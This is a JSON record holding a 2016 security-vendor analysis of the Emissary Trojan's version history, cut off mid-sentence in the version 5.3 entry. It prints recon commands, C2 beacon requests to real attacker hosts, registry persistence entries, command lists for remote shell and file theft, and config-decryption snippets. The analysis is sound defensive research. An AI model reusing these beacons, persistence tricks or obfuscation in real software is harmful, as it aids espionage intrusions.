{
    "id": "b57dbdef-0d05-4cd2-a1e5-56a5b21a1c3c",
    "created_at": "2023-01-12T15:02:36.954594Z",
    "updated_at": "2025-03-27T02:13:48.711019Z",
    "deleted_at": null,
    "sha1_hash": "615b2813bc1d111640b030c0a405324dcd9481a6",
    "title": "2016-02-03 - Emissary Trojan Changelog- Did Operation Lotus Blossom Cause It to Evolve-",
    "authors": "",
    "file_creation_date": "2022-05-28T00:33:19Z",
    "file_modification_date": "2022-05-28T00:33:19Z",
    "file_size": 473641,
    "plain_text": "# Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?\n\n**researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-**\nevolve/\n\nRobert Falcone, Jen Miller-Osborn February 3, 2016\n\nBy [Robert Falcone and](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Jen Miller-Osborn](https://unit42.paloaltonetworks.com/author/jen-miller-osborn/)\n\nFebruary 3, 2016 at 11:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [cyber espionage,](https://unit42.paloaltonetworks.com/tag/cyber-espionage/) [cybersecurity,](https://unit42.paloaltonetworks.com/tag/cybersecurity/) [Elise,](https://unit42.paloaltonetworks.com/tag/elise/) [Emissary,](https://unit42.paloaltonetworks.com/tag/emissary/) [Espionage,](https://unit42.paloaltonetworks.com/tag/espionage/) Lotus\nBlossom, [Trojans](https://unit42.paloaltonetworks.com/tag/trojans/)\n\n[In December 2015, Unit 42 published a blog about a cyber espionage attack using the](https://blog.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/)\nEmissary Trojan as a payload. Emissary is related to the Elise Trojan and the Operation\nLotus Blossom attack campaign, which prompted us to start collecting additional samples of\nEmissary.\n\nThe oldest sample we found was created in 2009, indicating this tool has been in use for\nalmost seven years. Of note, this is three years earlier than the oldest Elise sample we have\nfound, suggesting this group has been active longer than previously documented. In addition,\nEmissary appears to only be used against Taiwanese or Hong Kong based targets, all of the\ndecoys are written in Traditional Chinese, and they use themes related to the government or\nmilitary.\n\nWe also found several different versions of Emissary that had several iterative changes that\nshow how the Trojan evolved over the years. One of the most interesting observations made\nduring this analysis is that the amount of development effort devoted to Emissary\n[significantly increased after we published our Operation Lotus Blossom report in June 2015,](https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\nresulting in many new versions of the Emissary Trojan. In addition, we observed a TTP shift\npost publication with regards to their malware delivery; they started using compromised but\nlegitimate domains to serve their malware. Interestingly, the C2 infrastructure is also\nsomewhat different than that used by Elise.\n\n## Targeting\n\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in\nregion appropriate languages, all of the Emissary decoys we’ve collected are written in\nTraditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have\n\n\n-----\n\nidentified are also limited to those two regions. Despite appearing to target a more limited\ngeographical range, Emissary targeted the government, higher education, and high tech\ncompanies with a mix of copy and pasted news articles and documents that do not appear to\nbe available online. Decoys include:\n\nAn Excel spreadsheet containing legitimate contact information for much of the\nTaiwanese government that does not appear to be available online.\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military\nregion, Wang Huanguang, responds negatively to a 2014 magazine article from a\nrespected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and\ndiscussing the issues with an attempted military takeover.\nCopy of a news article from 2010 about the Chinese League of Victims protesting the\ninvoluntary removal of Shanghai residents in the lead up to the Shanghai Expo.\nCopy of the official Taiwan holiday schedule for 2016, which is the 105 anniversary ofth\nthe current Taiwanese government.\n\nFigure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military\nRegion Wang Huangguang.\n\n## Evolve to Survive: TTP Shifts and Infrastructure\n\nWe’ve expanded our knowledge of Emissary infrastructure significantly since our first\nEmissary blog and we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with\nonly one purchased from a Chinese reseller In contrast the Elise samples used a mix of\n\n\n-----\n\nactor-registered and DDNS, with the actor-registered serving as one of the data points we\nused to tie all of the activity together. While the use of DDNS can make tying activity together\nmore difficult, and despite the new Emissary variants since our publication, two of the most\nrecent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The\nEmissary samples typically have three hardcoded C2s that are a mix of IPs and domain\nnames, with one of the domains or IPs not being used by the other three C2s in a likely effort\nto avoid loss of control. A full IOC list is included at the end of this report.\n\nAlso new is the actors’ use of compromised legitimate Taiwanese websites to serve their\nmalware, including the official website of the Democratic Progressive Party. This is\nparticularly interesting as Taiwan just held a closely watched Presidential election on 16\nJanuary where DPP candidate Tsai Ing-wen won. This marked the first time a woman was\nelected President of Taiwan and only the second time a member of the Kuomintang did not\nhold the office since being ousted from China in 1949 when the Communist Party of China\ntook power. In line with her party’s stance, she is widely seen as a proponent of an\nindependent Taiwan and not in favor of reunification with the People’s Republic of China.\n\n## Malware Updates\n\nOur evidence suggests that malware authors created Emissary as early as 2009, which\nsuggests that threat actors have relied on this tool as a payload in cyber-espionage attacks\nfor many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted\nsystem. While it lacks more advanced functionality like screen capturing, it is still able to\ncarry out most tasks desired by threat actors: exfiltration of files, ability to download and\nexecute additional payloads, and gain remote shell access. It appears that threat actors have\ncontinually used this Trojan, and developed several updated versions of Emissary to remain\nundetected and fresh over time.\n\nWe analyzed all of the known Emissary samples to determine what changes the malware\nauthor made between the different versions of the Trojan. During our analysis, we examined\nwhen each sample was created based on its compile time and produced a simple timeline,\nseen in Figure 2, to display the development efforts expended on the Emissary Trojan. It\nshould be noted that we know some Emissary samples have been used multiple times with\ndifferent configurations, so the timeline only shows when development activity took place on\nEmissary and should not be misconstrued to when Emissary was used in attacks.\n\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in\nMay 2009 and quickly received an update that resulted in version 1.1 in June 2009. The\nTrojan did not receive much in the form of updates until September 2011 when the author\nreleased version 2.0. Version 2.0 received one update in October 2013 before the malware\nauthor released version 3.0 in December 2014. The malware author released version 4.0 in\nMarch 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which\nwas out-of-sequence from the incrementing versioning. Between August and November\n\n\n-----\n\n2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3\nand 5.4 in a much more rapid succession compared to development process in earlier\nversions.\n\n\n-----\n\n-----\n\n-----\n\nFigure 2: Timeline of development efforts spent on Emissary\n\nThe out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on\nsignificant similarities (discussed in the changelog section) that are not seen in the original\nversion 3.0 and other earlier versions of Emissary. One campaign code associated with of\nthe out-of-sequence version 3.0 sample was “3test”, suggesting the malware author created\nit for testing purposes. The other campaign code associated with the out-of-sequence\nsample was “IC00001”, which could denote an attack payload as it appears to be a plausible\ncode to describe a campaign.\n\nWhile this may be coincidental, the out-of-sequence version 3.0 sample was created ten\n[days after we published the Operation Lotus Blossom paper that exposed the Elise Trojan](https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\nthat is closely related to Emissary. It is possible that the threat actors were prompted to make\nmalware changes in response to our research. Regardless of causation, the rapid\ndevelopment of new versions of Emissary suggests that the malware authors are making\nfrequent modifications to evade detection, which as a corollary suggests the threat actors are\nactively using the Emissary Trojan as a payload in attacks.\n\n## Emissary Changelog\n\nIn this section, we discuss the changes observed between each version of Emissary. As this\nsection is focused on changes, the features and functionality are the same between\nEmissary versions unless otherwise mentioned.\n\n**Version 1.0**\n\n**Date: 5/12/2009**\n\nSHA256: a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484\nOriginal Name: WUMsvc.dll\n\n**Initial Release**\n\n\n-----\n\nThe initial loader Trojan writes Emissary to %SYSTEM%\\WSPsvc.dll and installs it as a\nservice, which will run the exported function \"ServiceMain\" within the Emissary Trojan to\ncarry out its functionality.\n\nConfiguration data is stored in the last 1024 bytes of the payload, from which the Trojan will\nextract an 896 byte structure. The configuration is decrypted with an algorithm that uses the\nXOR operation on each byte using the value at a different offset within the ciphertext.\n\nThe code will create the following registry keys:\n\n\n1\n2\n\n\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID\n\n\nEmissary uses the \"CheckCode\" registry key to store the encrypted configuration for the\nTrojan, while it stores a GUID that Emissary uses to uniquely identify the compromised host\nin the \"CheckID\" key.\n\nThe malware performs initial system information gathering and saves data to a file named\nTMP2548. The initial gathering relies on a combination of the following commands executed\nby the command prompt:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ncommands executed by the command prompt:\n\nECHO VER\nVER\nECHO IPCONFIG /ALL\nIPCONFIG /ALL\nECHO NET LOCALGROUP ADMINISTRATORS\nNET LOCALGROUP ADMINISTRATORS\nECHO NET START\nNET START\nECHO GPRESULT /Z\nGPRESULT /Z\nECHO GPRESULT         /SCOPE COMPUTER /Z\nGPRESULT           /SCOPE COMPUTER /Z\nECHO SYSTEMINFO\nSYSTEMINFO\n\n\nEmissary parses command and control responses for \"instru\", which will precede a GUID\nvalue that designates the command the C2 server wishes to execute on the system. The\ncommand handler does not use a nested if/else or switch statement like most malware\nfamilies, instead Emissary creates a structure that contains all of the available command\nGUIDs that it will iterate through each time the C2 supplies a GUID in order to determine\nwhich command the operator wishes to execute. Emissary can include up to 32 different\n\n\n-----\n\ncommands within this data structure, but it appears the author has decided to include six\ncommands within the Trojan. The following denotes the command handler structure used by\nEmissary v1.0:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nstruct EMISSARY_COMMAND\n{\nCHAR guid[40];\nDWORD sub_function;\nDWORD arg1_subfunction;\nDWORD arg2_subfunction;\nDWORD arg3_subfunction;\n};\n\nstruct commandHandler\n{\nDWORD number_of_commands;\nDWORD unused;\nstruct EMISSARY_COMMAND cmd_0;\nstruct EMISSARY_COMMAND cmd_1;\nstruct EMISSARY_COMMAND cmd_2;\nstruct EMISSARY_COMMAND cmd_3;\nstruct EMISSARY_COMMAND cmd_4;\nstruct EMISSARY_COMMAND cmd_5;\n};\n\n\nTable 1 contains the commands available within the Emissary v1.0 command handler.\n\n**Command** **Description**\n\n\nbac84b12-5b0b491f-a8858667d156394f\n\n3d8313cc-53ca4751-bbbfea5f914f8e65\n\ndb0e93e7-b46c4cba-81f1ec70da57dc19\n\n2e382e51-30894293-84545eccb253eb54\n\na57db08a-bf974b43-b27d157e62e2fd74\n\n\nUpload file.\n\nDownload file.\n\nUpdate config. C2 specifies files as: p1 = C2 server 1, p2 = C2 server\n2, p3 = C2 server 3, p4 = Sleep Interval, p5 = System Identifier\n(computer name), p6 = GUID for beacon.\n\nExecutes a specified command.\n\nCreate remote shell.\n\n\n-----\n\neab5c1ab-a4974fc2-bbe0049be45d6f2d\n\n\nUpdate Trojan with new executable.\n\n\nTable 1: Emissary command handler\n\nThe Emissary version 1.0 beacon to the C2 server appears as follows:\n\n\n1\n2\n3\n4\n\n\nGET /VSNET/default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0\nHost: 193.34.144[.]21\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e67f8c7f4cdca6\n\n\n**Date: 5/31/2009**\n\nSHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30,\nOriginal Name: WUMsvc.dll\n\nRemoved checks for \"//\" and \"/\" in the update configuration command when updating the\nthree C2 servers.\n\n**Version 1.1**\n\n**Date: 6/5/2009**\n\nSHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\n\nOriginal Name: WUMsvc.dll\n\nBug fixes:\n\nAdded code to make sure the content received from the C2 server matches the\n\"Content-Length\" value in the HTTP response.\nCode added to allow for the download of more than 524,288 bytes.\n\nThe Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:\n\n\n1\n2\n3\n4\n\n\nGET /eng/comfunc/comfunc/default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0\nHost: 137.189.145.1\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e67f8c7f4cdca6\n\n\n**Version 2.0**\n\n**Date: 9/15/2011**\n\n\n-----\n\nSHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099\nOriginal Name: EmissaryDll.dll\n\nVersion 2.0 was a significant re-write of the Emissary Trojan.\n\nThe configuration data for the Trojan is still saved to the registry, but the registry key has\nchanged to:\n\n1 SOFTWARE\\Microsoft\\VBA\\VbaData\n\nThe configuration structure also changed in size to 464 bytes. The Emissary configuration is\nnow encrypted using a custom algorithm that uses the \"srand\" function to seed the \"rand\"\nfunction using a value of 2563. This seed value causes the \"rand\" function to generate the\nsame values each time, which Emissary will use as a key along with the XOR operation. The\nconfiguration now contains the version number of Emissary, instead of the version being\nhardcoded into the Trojan.\n\nThis version of Emissary keeps track of which C2 location within its configuration that it has\nbeen communicating with by storing the index of the C2 server (1, 2, or 3) in the following\nregistry key:\n\n1 SOFTWARE\\Microsoft\\VBA\\VbaList\n\nThis version of Emissary moves away from the command handler using the structure and\nmoves to a nested if/else statement for less complicated command handling; however, the\ncommand GUID and commands themselves are unchanged.\n\nThe Emissary version 2.0 beacon changed slightly from previous versions, specifically the\nremoval of the User-Agent field and the use of a lowercase \"h\" in the \"Host\" field. The\nfollowing is an example of the version 2.0 beacon, which contains the same GUID and \"op\"\nvalues:\n\n\n1\n2\n3\n\n\nGET /0test/test/default.aspx HTTP/1.1\nhost: 163.20.127.27\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e67f8c7f4cdca6;\n\n\nVersion 2.0 also introduces a debug message logging system that includes verbose error\nmessages that are accompanied by an error ID number. Error messages are written to the\nfile %TEMP%\\em.log. The following is a list of all possible debug messages:\n\n\n1\n2\n3\n4\n\n\nSource - Error ID - Debug Message\nemissarydll.cpp - 0x30 - InitApp() - Event already exists\nemissarydll.cpp - 0x35 - InitApp() - Event create successful\nemissarydll cpp - 0x3b - InitApp() - create work thread\n\n\n-----\n\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\nshell.cpp 0x30 SendShellOutputThread PeekNamedPipe Error : 0x%08x\nshell.cpp - 0x3e - SendShellOutputThread() : Timeout\nshell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x\nshell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x\nshell.cpp - 0x62 - SendShellOutputThread() : thread exit\nshell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x\nshell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x\nshell.cpp - 0x8f - RecvShellCmdThread() : thread exit\nshell.cpp - 0xeb - Error occured : %s [%d]\nshell.cpp - 0xfa - TerminateThread Input Thread\nshell.cpp - 0x100 - TerminateThread Output Thread\nshell.cpp - 0x118 - SocketShell - Fail To Create Reverse Socket\nshell.cpp - 0x12f - SocketShell - Fail To Generate Reverse Shell\nshell.cpp - 0x13a - SocketShell - SocketShell - Fail To Generate Reverse Shell\nshell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK\nconfig.cpp - 0x38 - RegCreateKeyEx error : %0x08x\nconfig.cpp - 0x46 - RegSetValueEx error : %0x08x\nconfig.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x\nconfig.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x\nconfig.cpp - 0xab - find user: %s\nconfig.cpp - 0xbc - can not find proxy\nconfig.cpp - 0xc7 - get ProxySetting failed\nconfig.cpp - 0xd4 - find proxy server : %s\nrun.cpp -   0x75 - InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d]\n\n[g_ServerUrl:%s]\nrun.cpp - 0x9d - InitConfig: [g_DelayTime:%d]\nrun.cpp - 0xbe - get proxy the last time used:%s\nrun.cpp - 0xc3 - server index:%d\nrun.cpp - 0xd9 - RetryTimes = %d\nrun.cpp - 0xec - connect %s error :%s\nrun.cpp - 0x10c - process a request ok.\nhttpclient.cpp - 0x98 - ASP.NET_SessionId长度异常:[%d][%s] (translation:\nASP.NET_SessionId Length Exception:[%d][%s])\nhttpclient.cpp - 0xd0 - ******not connected !\nhttpclient.cpp - 0xf4 - read hread error : %s\nhttpclient.cpp - 0x102 - body length = 0\nhttpclient.cpp - 0x13d - decrypt error\"\nhttpclient.cpp - 0x211 - instruction : <instruction>\nhttpclient.cpp - 0x21d - no instruction guid\nhttpclient.cpp - 0x22c - OP_DOWNLOAD no local file name\nhttpclient.cpp - 0x23b - OP_UPLoad no local file name\nhttpclient.cpp - 0x249 - OP_UPLoad no local file name\nhttpclient.cpp - 0x242 - OP_UPLoad no local file name\nhttpclient.cpp - 0x25b - OP_EXECUTE no cmd list\nhttpclient.cpp - 0x262 - OP_EXECUTE no timeout\nhttpclient.cpp - 0x2b4 - OP_SHELL ip\nhttpclient.cpp - 0x2bb - OP_SHELL port\nhttpclient.cpp - 0x2dd - OP_CHANGECONFIG server1\nhttpclient.cpp - 0x2e4 - OP_CHANGECONFIG server2\nhttpclient.cpp - 0x2eb - OP_CHANGECONFIG server3\nhttpclient.cpp - 0x2f2 - OP_CHANGECONFIG timestr\nhttpclient cpp - 0x2f9 - OP CHANGECONFIG namestr\n\n\n-----\n\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nhttpclient.cpp 0x300 OP_CHANGECONFIG guid\nhttpclient.cpp - 0x321 - not connected\nhttpclient.cpp - 0x361 - send msg error\nhttpdoinstruction.cpp - 0x28 - DownloadFile - LocalFileName=%s\nhttpdoinstruction.cpp - 0x5c - download file http head:%s\nhttpdoinstruction.cpp - 0x7a - download file ok\nhttpdoinstruction.cpp - 0xac - UploadFile - LocalFileName=%s\nhttpdoinstruction.cpp - 0xb4 - DownloadFile - Error - Open File [%S][0x%08x]\nhttpdoinstruction.cpp - 0xc7 - UploadFile:TotalLength=%d\nhttpdoinstruction.cpp - 0x124 - download file http head:%s\n\n\n**Date: 10/24/2013**\n\nSHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\n\nOriginal Name: NetPigeon_DLL.dll\n\nThis update to Emissary allowed the Trojan to run as a service. The configuration now\ncontains settings for the Emissary service, which the Trojan will store in and access from the\nfollowing registry keys:\n\nSOFTWARE\\Microsoft\\VBA\\Serv -> Service Name\n\nSOFTWARE\\Microsoft\\VBA\\VbaList -> Binary Path for the Service\n\nAlso, this version of Emissary was created using Microsoft Foundation Classes (MFC) to\ncarry out a majority of its functionality. For instance, instead of manually building an HTTP\nrequest as in previous versions, this version uses the MFC functions to create the HTTP\nrequest and send it to the C2 server:\n\nCInternetSession::CInternetSession\nCInternetSession::GetHttpConnection\nCHttpConnection::OpenRequest\nCHttpFile::AddRequestHeaders\nCInternetSession::SetCookie\nCHttpFile::SendRequest\n\nUsing these classes creates a significantly different HTTP request sent to the C2 server, but\nthe functionality of obtaining instructions from the C2 is the same. The following is an\nexample of a beacon generated by this sample, which contains the same \"op\" value and has\nadditional fields within the HTTP header:\n\n\n-----\n\n1\n2\n3\n4\n5\n\n\nGET /lightserver/Default.aspx HTTP/1.0\nCache-Control: no-cache\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: groupspace.findhere.org\nCookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E; op=1635b097-ffe4-471189e6-7f8c7f4cdca6\n\n\nThe logging functionality within this update no longer includes error ID values, but still\ncontains verbose debug messages that are written to a file named %TEMP%\\msmqinst.ax.\n\n**Version 3.0**\n\n**Date: 12/24/2014**\n\nSHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\n\nOriginal Name: Generic.dll\n\nBug fixes:\n\nAdded a function to the configuration update command that checks to see if the C2\nprovided a new sleep interval at offset 460 and uses the interval stored in the VbaData\nregistry key if its missing. This fixes the bug that would not allow the sleep interval to\nupdate correctly.\n\n**Version 4.0**\n\n**Date: 3/26/2015**\n\nSHA256: 5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\n\nOriginal Name: Generic.dll\n\nThis version of Emissary includes both the installation and loading functionality along with\nthe Emissary functional code in the same file. The installation and loading portion of the\nTrojan is called using an exported function named \"Setting\", which moves the file to:\n\n1 %TEMP%\\Remdisk.dll\n\nThe loading portion of this version of Emissary checks the permissions of the current user\nand either installs Emissary as a service or as a standalone Trojan. To install as a service,\nthe loader will enumerate the services on the system looking for services running under the\n\"netsvcs\" group, and it will attempt to hijack the first \"netsvcs\" service by replacing the\n\"ServiceDLL\" parameter to point to the Emissary DLL. For instance, during the analysis\nperiod, the installation code changed the following registry key of the AppMgmt:\n\n\n-----\n\n1 HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\"%SystemRoot%\\System32\\appmgmts.dll\"\n\nto\n\n1 HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll\"\n\nIf the user does not have permissions to add a service, the installation routine attempts to\nadd persistence by creating the following registry key that will run the functional code within\nEmissary via an exported function named \"DllRegister\":\n\n1 Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll,DllRegister\"\n\nThis version of emissary has its configuration appended to the end of the DLL, specifically\nstarting at offset 0xc600. The following code accesses the configuration embedded within the\nDLL and decrypts it using a single byte XOR algorithm using 65 as the key:\n\n\n1\n2\n3\n4\n5\n6\n\n\nSetFilePointer(v2, 0xC600, 0, 0);\nReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &NumberOfBytesRead, 0);\niteration_count = 0;\ndo\n*(iteration_count++ + buffer_for_config) += 65;\nwhile ( iteration_count < 0x1D0 );\n\n\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the\nsrand and rand functions to generate a key to use in conjunction with the XOR operation.\nWith the configuration embedded within the Emissary DLL, each Emissary version 4.0\nsample will have a different hash as the configuration data changes.\n\nThe network beacon sent from Emissary version 4.0 is the same as other previous versions\nstarting at version 2.0, as seen in the following:\n\n\n1\n2\n3\n4\n5\n\n\nGET /lightserver/Default.aspx HTTP/1.0\nCache-Control: no-cache\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 210.209.121.92\nCookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-471189e6-7f8c7f4cdca6\n\n\n**Version 3.0: Out-of-sequence**\n\n**Date: 6/25/2015**\n\n\n-----\n\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\n\nOriginal Name: IISDLL.dll\n\n**Major Overhaul**\n\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of\norder, as it occurs after the compilation of Emissary version 4.0. The differences between this\nout of order sample compared to the other known version 3.0 sample, as well as version 4.0\nfor that matter, include a dramatic change in configuration storage and the handling of\ncommands. Also, the files stored on the system have different names than Emissary versions\nin the past, which are:\n\n\n1\n2\n3\n4\n5\n\n\n%TEMP%\\000IISA758C8FEAE5F.TMP -> Log file\n\n%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration file\n\n%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary DLL\n\n\nThis version of Emissary is designed to be injected into an Internet Explorer process by its\nassociated loader Trojan, which marks the first time Emissary executes through DLL\ninjection.\n\nThis version of Emissary also has a different configuration structure than prior versions. The\nconfiguration is no longer stored in the registry; rather it is saved to a file named\n75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file and read the next\n132 bytes, which it will decrypt with a new algorithm as seen in the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\nReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);\nCloseHandle(h_config_file);\nsrand(0xA03u);\niteration_count = 0;\ndo\n*(buffer_for_config + iteration_count++) ^= rand() % 128;\nwhile ( iteration_count < 0x84 );\n\n\nThe configuration structure has also changed as well, with Emissary now using the following\nstructure:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nstruct emissary_new_config {\nWORD Emissary_version_major;\nWORD Emissary_version_minor;\nCHAR[36] GUID_for_sample;\nWORD Unknown1;\nCHAR[128] Server1;\nCHAR[128] Server2;\nCHAR[128] Server3;\nCHAR[128] CampaignName;\nCHAR[550] Unknown2;\nWORD Delay_interval_seconds;\n};\n\n\nThis version of Emissary also introduced a new command handler that uses number-based\ncommands instead of the GUID commands seen in prior versions of Emissary. The\nfunctionality of the commands are the same, however, the commands themselves are\ninvoked using a number. Table 2 contains a list of available commands and a brief\ndescription of the functionality carried out by the command.\n\n**Command** **Description**\n\n102 Upload a file to the C2 server.\n\n103 Executes a specified command.\n\n104 Download file from the C2 server.\n\n105 Update configuration file.\n\n106 Create a remote shell.\n\n107 Updates the Trojan with a new executable.\n\nTable 2: New Emissary command handler\n\nThe network beacon sent from this version of Emissary is very similar to the beacon first\nintroduced in Emissary version 2.0; however, the \"op\" value of \"101\" is hardcoded for the\nbeacon and replaces the GUID based op designator to match the new command handler.\nThe following is an example of the network beacon generated by this version of Emissary:\n\n\n1\n2\n3\n4\n5\n\n\nGET /default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.92\nCache-Control: no-cache\nCookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101\n\n\n**Version 5.0**\n\n\n-----\n\n**Date: 8/25/2015**\n\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634,\nOriginal Name: WinDLL.dll\n\nEmissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests\nthat the malware author just forgot to change the version number of the out of order sample.\nWhile the configuration and Emissary DLL filenames used by the version 5.0 Emissary\nsample are the same as the out-of-order version 3.0 sample, the log file name differs but\nonly slightly, as seen in the following list of related files:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n%TEMP%\\000A758C8FEAE5F.TMP -> Log File\n\n%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration file\n\n%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary DLL\n\n%APPDATA%\\LocalData\\ishelp.dll -> Loader DLL\n\n\nVersion 5.0 uses numbers within its command handler and the same configuration structure\nas the out-of-order version 3.0. The only major change in 5.0 is the ability to obtain a\ncompromised system's external IP address by performing an HTTP GET request to\n\"http://showip.net/index.php\". The code will parse the response from this webserver for the\nfollowing to obtain the system's IP address:\n\n1 <input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\n\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR\noperation on the data using 0x76 as the key on the first byte and the resulting cleartext byte\nas the key on the next byte and so on. The network beacon sent from this version of\nEmissary visually resembles the out-of-order version, with the addition of a field \"SHO\" that\ncontains the IP address of the compromised host. The following is an example of the\nEmissary version 5.0 network beacon, which is also the same in versions 5.1, 5.3 and 5.4 as\nwell:\n\n\n1\n2\n3\n4\n5\n\n\nGET /default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.95\nCache-Control: no-cache\nCookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130\n\n\n**Version 5.1**\n\n**Date: 9/29/2015**\n\n\n-----\n\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\n\nOriginal Name: WinDLL.dll\n\nFor version 5.1 the malware author took out the exception handling in the Upload File\ncommand and obfuscated two strings within the Trojan to avoid detection. The strings exist in\nthe Trojan in encrypted form and are decrypted using an algorithm that uses addition to each\nbyte of ciphertext, using 65 (\"A\") as a key. The obfuscated strings, as seen below, involve the\nfilename of the log file and the command prompt executable used to create the remote shell:\n\n\n1\n2\n\n\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F =\n000A758C8FEAE5F.TMP\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\n\n\n**Date: 10/14/2015**\n\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\n\nOriginal Name: WinDLL.dll\n\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled\nwithout making any changes.\n\n**Version 5.3**\n\n**Date: 11/7/2015**\n\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\n\nOriginal Name: WinDLL.dll\n\nEmissary 5.3 moved some code used to create the remote shell 